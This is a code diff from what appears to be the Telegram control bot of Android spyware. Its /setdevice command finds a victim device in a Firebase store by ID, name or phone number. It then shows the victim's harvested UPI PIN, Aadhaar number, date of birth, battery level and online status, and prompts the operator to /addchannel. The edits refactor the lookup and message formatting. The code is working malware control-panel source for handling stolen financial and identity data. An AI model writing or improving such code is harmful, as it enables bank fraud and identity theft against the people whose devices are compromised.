@@ -121,31 +121,52 @@ async def set_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def set_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check(update): return
     global firebase_base, selected_device_id
+    
+    # Agar user ne /setdevice <id> dala hai
     if context.args:
         search_query = " ".join(context.args).lower()
         try:
             response = requests.get(f"{firebase_base}/user_data.json")
             clients = response.json() or {}
+            
+            # Direct match check
             found_id = None
-            for client_id, info in clients.items():
-                if client_id.lower() == search_query or str(info.get('d_name', '')).lower() == search_query or str(info.get('phoneNumber', '')).lower() == search_query:
-                    found_id = client_id
-                    break
+            if search_query in clients:
+                found_id = search_query
+            else:
+                # Agar ID nahi, toh name/phone se dhoondo
+                for client_id, info in clients.items():
+                    if str(info.get('d_name', '')).lower() == search_query or str(info.get('phoneNumber', '')).lower() == search_query:
+                        found_id = client_id
+                        break
             
             if found_id:
-                selected_device_id = found_id
+                selected_device_id = found_id # Yahan device update ho gayi
                 details = requests.get(f"{firebase_base}/user_data/{found_id}.json").json() or {}
                 login_resp = requests.get(f"{firebase_base}/All_Users/Login/{found_id}.json")
                 login_data = login_resp.json() if login_resp.status_code == 200 and login_resp.json() else {}
-                pin, adhar, dob = login_data.get('pin', 'N/A'), login_data.get('Adhar', 'N/A'), login_data.get('dob', 'N/A')
+                
+                pin = login_data.get('pin', 'N/A')
+                adhar = login_data.get('Adhar', 'N/A')
+                dob = login_data.get('dob', 'N/A')
                 status = "ONLINE 🟢" if details.get('status') == "online" else "OFFLINE 🔴"
-                msg = (f"📱 {details.get('d_name', 'Unknown')}\n🆔 {found_id}\n📞 {details.get('phoneNumber', 'Unknown')}\n🔋 {details.get('battery', 'N/A')}%\n📌 UPI Pin: {pin}\n💳 Adhar: {adhar}\n📅 DOB: {dob}\n{status}\n\n✅ Device Select ho gayi! Next: /addchannel <channel_id>")
+                
+                msg = (f"📱 {details.get('d_name', 'Unknown')}\n"
+                       f"🆔 {found_id}\n"
+                       f"📞 {details.get('phoneNumber', 'Unknown')}\n"
+                       f"🔋 {details.get('battery', 'N/A')}%\n"
+                       f"📌 UPI Pin: {pin}\n"
+                       f"💳 Adhar: {adhar}\n"
+                       f"📅 DOB: {dob}\n"
+                       f"{status}\n\n"
+                       f"✅ Device '{found_id}' select ho gayi! Next: /addchannel <channel_id>")
                 await update.message.reply_text(msg)
             else:
                 await update.message.reply_text(f"❌ Device '{search_query}' nahi mili.")
         except Exception as e:
             await update.message.reply_text(f"Error: {str(e)}")
     else:
+        # Agar sirf /setdevice likha hai, list dikhao
         await show_device_page(update, context, 0)
 
 async def show_device_page(update, context, page):
